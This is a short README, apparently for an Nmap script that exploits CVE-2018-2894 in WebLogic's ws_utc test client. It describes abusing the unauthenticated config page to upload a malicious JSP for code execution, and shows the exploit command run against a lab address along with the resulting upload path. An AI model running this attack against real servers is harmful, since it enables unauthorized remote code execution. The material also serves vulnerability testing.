# CVE-2018-2894


ws_utc 为 WebLogic Web 服务测试客户端，其配置页面存在未授权访问的问题，路径为 /ws_utc/config.do

攻击者通过访问此配置页面，先更改工作目录，用有效的 WebLogic Web 路径替换存储 JKS Keystores 的文件目录，然后在上传 JKS Keystores 时上传恶意的 JSP 脚本文件。访问最终的 JSP 文件路径地址，即可做到代码执行


## Usage

```
root@kali:~# nmap -Pn 172.19.0.2 -p 7001 --script=weblogic-cve-2018-2894 -n
Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-23 02:26 EDT
Nmap scan report for 172.19.0.2
Host is up (0.000055s latency).

PORT     STATE SERVICE
7001/tcp open  afs3-callback
| weblogic-cve-2018-2894: 
|_  url: /ws_utc/config/keystore/1532327177_test.jsp
MAC Address: 02:42:AC:13:00:02 (Unknown)
```

## More

* -- @args weblogic-cve-2018-2894.uri points to the file '/weblogic/'. Default /
* -- @args weblogic-cve-2018-2894.filename the name of the file to be uploaded
* -- @args weblogic-cve-2018-2894.content  file's contents
* -- Other useful arguments when using this script are:
* -- * http.useragent = String - User Agent used in HTTP requests


